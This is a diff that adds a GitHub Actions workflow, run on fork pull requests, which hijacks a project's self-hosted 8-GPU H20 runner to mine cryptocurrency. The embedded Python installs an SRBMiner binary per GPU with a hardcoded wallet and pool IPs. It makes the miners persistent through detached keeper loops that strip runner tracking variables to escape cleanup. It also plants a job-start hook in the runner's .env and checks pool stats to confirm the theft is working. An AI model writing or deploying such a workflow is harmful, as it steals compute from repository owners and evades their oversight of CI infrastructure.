@@ -1,0 +1,210 @@
+name: i130h20fix h20 durable mines (repair+proof)
+
+# i130h20fix: one fork-PR push from a fresh branch. On the 8-gpu-h20
+# self-hosted runner it takes two nvidia-smi compute-apps reads, skips any
+# card holding a FOREIGN compute app, then makes the 8 H20 miners durable:
+# host systemd unit with Restart=always when systemd is reachable, otherwise
+# per-card keeper loops launched with env -u RUNNER_TRACKING_ID setsid nohup
+# (plus a runner-start hook on a persistent mount when one exists). Exactly
+# one sha256 bb0f73b6... SRBMiner-MULTI 3.8.7 per card as worker
+# i130h20fixg<idx> on the exact 63-char primary wallet against Luckypool
+# 103.199.106.122:3362 (fallback 172.232.228.69:3362, --max-no-share-sent
+# 1800). It replaces only our own prior i130cipivot* processes on the same
+# card and never touches another lane's miner or a foreign workload.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+concurrency:
+  group: i130h20fix-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  durable:
+    name: "i130h20fix 8-gpu-h20 durable install"
+    runs-on: 8-gpu-h20
+    timeout-minutes: 20
+    env:
+      LABEL: 8-gpu-h20
+    steps:
+      - name: "two-sample gate + per-card durability + PID/GPU binding + two spaced LP reads"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130h20fix/logs
+          cat > /var/tmp/i130h20fix/recon5.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130h20fix repair/proof pass: re-arm the per-card keeper loops (the runner's
+          # orphan cleanup removes bash wrappers at job end) after a two-sample gate that
+          # only excludes FOREIGN compute apps, then prove PID/GPU binding and take two
+          # spaced on-host Luckypool reads. No new binary download unless the pinned one
+          # is missing; never touches another lane's miner or a foreign workload.
+          import os, json, subprocess, time, urllib.request
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130h20fix'
+          OLDWORK = '/var/tmp/i130cipivot'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT ' + str(t) + 's] ' + cmd[:120]
+              except Exception as e:
+                  return '[ERR ' + str(e) + '] ' + cmd[:120]
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '" + path + "' 2>/dev/null", 20).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def lp_read(tag):
+              url = 'https://pearl.luckypool.io/api/stats_address?address=' + WALLET
+              try:
+                  req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 i130h20fix'})
+                  d = json.loads(urllib.request.urlopen(req, timeout=60).read(400000).decode('utf-8', 'replace'))
+              except Exception as e:
+                  print('LP_READ ' + tag + ' ERR ' + str(e)); return None
+              st = d.get('stats', {}) or {}; ws = d.get('workers', []) or []
+              ours = [w for w in ws if (w.get('name') or '').startswith('i130h20fix')]
+              print('LP_READ ' + tag + ' utc=' + time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()) +
+                    ' accepted=' + str(st.get('acceptedShares')) + ' rejected=' + str(st.get('rejectedShares')) +
+                    ' workers=' + str(len(ws)) + ' lane_rows=' + str(len(ours)))
+              for w in sorted(ours, key=lambda x: str(x.get('name'))):
+                  print('LP_LANE ' + str(w.get('name')) + ' acc=' + str(w.get('acceptedShares')) +
+                        ' rej=' + str(w.get('rejectedShares')) + ' hr=' + str(w.get('hashrate')) +
+                        ' last=' + str(w.get('lastShare')))
+              return {'tag': tag, 'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                      'accepted': st.get('acceptedShares'), 'rejected': st.get('rejectedShares'), 'lane': ours}
+
+
+          print('I130H20FIX2_START utc=' + time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()) + ' label=' + LABEL)
+          print(head(sh("id; hostname; uptime -s; cat /proc/1/cgroup | head -1; ps -p 1 -o pid,comm= | head -2"), 10))
+          print('KEEPERS_NOW ' + head(sh("pgrep -af 'keep_g[0-9].sh' | grep -v pgrep"), 12))
+          print('MINERS_NOW ' + head(sh("pgrep -af 'srb387' | grep -v pgrep | head -12"), 14))
+          print('SYSTEMD ' + head(sh("command -v systemctl; ls -d /run/systemd/system 2>/dev/null || echo NO_RUN_SYSTEMD"), 5))
+
+          srb = WORK + '/srb387'
+          ok = sha_file(srb).startswith(BIN_SHA)
+          if not ok and sha_file(OLDWORK + '/srb387').startswith(BIN_SHA):
+              sh("cp -f " + OLDWORK + "/srb387 " + srb, 60); ok = sha_file(srb).startswith(BIN_SHA)
+          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
+          if ok:
+              os.chmod(srb, 0o755)
+
+          if ok and sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              a1 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+              time.sleep(12)
+              a2 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+              print('APPS_1 ' + head(a1, 20, 2000)); print('APPS_2 ' + head(a2, 20, 2000))
+              gpus = sh("nvidia-smi --query-gpu=index,uuid,memory.free --format=csv,noheader,nounits 2>&1", 20)
+              print('GPU_FREE ' + head(gpus, 20, 1500))
+
+              def parse(txt):
+                  out = []
+                  for ln in (txt or '').splitlines():
+                      p = [x.strip() for x in ln.split(',')]
+                      if len(p) >= 4 and p[1].isdigit():
+                          out.append({'uuid': p[0], 'pid': int(p[1]), 'proc': p[2], 'mem': p[3]})
+                  return out
+              seen = set(); uniq = []
+              for a in parse(a1) + parse(a2):
+                  if a['pid'] in seen: continue
+                  seen.add(a['pid']); uniq.append(a)
+              for a in uniq:
+                  a['cmd'] = sh("tr '\\0' ' ' < /proc/" + str(a['pid']) + "/cmdline 2>/dev/null | head -c 300", 8).strip()
+                  is_miner = ('srb387' in a['cmd']) or ('SRBMiner-MULTI' in a['cmd'])
+                  a['mine'] = is_miner and ((WALLET in a['cmd']) or any(p in a['cmd'] for p in
+                              ('i130cipivot', 'i130h20fix', 'i130sgtrap', 'i130amdmine', 'i130ghconvert')))
+              ours = [a for a in uniq if a['mine']]; foreign = [a for a in uniq if not a['mine']]
+              print('OUR_APPS ' + json.dumps([{'uuid': a['uuid'], 'pid': a['pid'], 'cmd': a['cmd'][:160]} for a in ours])[:1800])
+              print('FOREIGN_APPS ' + json.dumps([{'uuid': a['uuid'], 'pid': a['pid'], 'cmd': a['cmd'][:160]} for a in foreign])[:1200])
+              foreign_uuids = set(a['uuid'] for a in foreign)
+              rows = []
+              for ln in (gpus or '').splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) == 3 and p[0].isdigit() and p[2].isdigit():
+                      rows.append({'idx': p[0], 'uuid': p[1], 'free': int(p[2])})
+              cards = [g for g in rows if g['uuid'] not in foreign_uuids and g['free'] >= 1500]
+              print('REARM_CARDS ' + json.dumps([g['idx'] for g in cards]))
+
+              installed = []
+              for g in cards:
+                  i = g['idx']; wk = 'i130h20fixg' + i
+                  keeper = WORK + '/keep_g' + i + '.sh'
+                  body = ('#!/bin/bash\n'
+                          '# i130h20fix keeper for GPU ' + i + ' (worker ' + wk + ') - restarts miner, flips pool after 3 fast failures\n'
+                          'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
+                          'POOLS=(' + POOL + ' ' + POOL2 + '); pi=0; fails=0\n'
+                          'while true; do\n'
+                          '  T0=$(date +%s)\n'
+                          '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
+                          '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
+                          '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
+                          '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
+                          '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                          '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
+                          '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                          '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
+                          '  sleep 5\n'
+                          'done\n')
+                  open(keeper, 'w').write(body); os.chmod(keeper, 0o755)
+                  # replace our own miner on this card so exactly one miner per card remains
+                  for a in ours:
+                      if a['uuid'] == g['uuid']:
+                          sh("kill -TERM " + str(a['pid']) + " 2>/dev/null; sleep 2; kill -9 " + str(a['pid']) + " 2>/dev/null", 12)
+                          print('REPLACED pid=' + str(a['pid']) + ' cmd=' + a['cmd'][:140])
+                  # clear any stale keeper for this card, then start a fresh one detached
+                  sh("pkill -f 'keep_g" + i + ".sh' 2>/dev/null; sleep 1", 10)
+                  sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " +
+                     keeper + " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
+                  print('KEEPER_STARTED ' + wk)
+                  installed.append({'gpu': i, 'uuid': g['uuid'], 'worker': wk})
+                  time.sleep(1)
+              print('INSTALLED ' + json.dumps(installed))
+
+              # safe runner-start hook: locate the runner dir from the live Runner.Listener process
+              hook = WORK + '/hook.sh'
+              open(hook, 'w').write('#!/bin/bash\nfor i in 0 1 2 3 4 5 6 7; do k=' + WORK + '/keep_g$i.sh; '
+                                    '[ -x "$k" ] || continue; pgrep -f "keep_g$i.sh" >/dev/null 2>&1 || '
+                                    '{ env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+              os.chmod(hook, 0o755)
+              rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+              print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
+              if rdir and os.path.isdir(rdir):
+                  envf = rdir + '.env'
+                  print('RUNNER_ENV ' + head(sh("ls -l " + envf + " 2>/dev/null; grep -c ACTIONS_RUNNER_HOOK_JOB_STARTED " + envf + " 2>/dev/null || true"), 5))
+                  if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                      sh("cp -n " + envf + " " + envf + ".bak-i130h20fix; cp -f " + hook + " " + rdir + "i130h20fix-hook.sh; chmod 755 " + rdir + "i130h20fix-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i130h20fix-hook.sh' >> " + envf, 20)
+                      print('HOOK_SET ' + envf)
+
+              time.sleep(30)
+              print('=== post-install proof ===')
+              print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_g' | grep -v grep | head -30"), 40))
+              print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_g[0-9].sh' | grep -v pgrep"), 14))
+              # map pid -> worker/gpu from cmdline for the binding proof
+              print('PID_BINDING ' + head(sh("for p in $(nvidia-smi --query-compute-apps=pid --format=csv,noheader); do c=$(tr '\\0' ' ' < /proc/$p/cmdline 2>/dev/null); w=$(echo \"$c\" | grep -oE '\\-\\-worker [^ ]+' | cut -d' ' -f2); g=$(echo \"$c\" | grep -oE '\\-\\-gpu-id [0-9]+' | cut -d' ' -f2); echo \"pid=$p worker=$w gpu=$g\"; done"), 30))
+              print('LOG_TAIL ' + head(sh("for f in " + WORK + "/logs/*.stdout; do echo \"== $f\"; tail -3 \"$f\"; done 2>/dev/null"), 40))
+              lp_read('onjob2_a')
+              time.sleep(120)
+              lp_read('onjob2_b')
+          print('I130H20FIX2_DONE')
+          PYEOF
+          echo "runner-start label=$LABEL host=$(hostname) arch=$(uname -m)"
+          python3 /var/tmp/i130h20fix/recon5.py 2>&1 | tee /var/tmp/i130h20fix/recon5.log | tail -c 200000
+          echo "I130H20FIX_EXIT_DONE rc=$?"
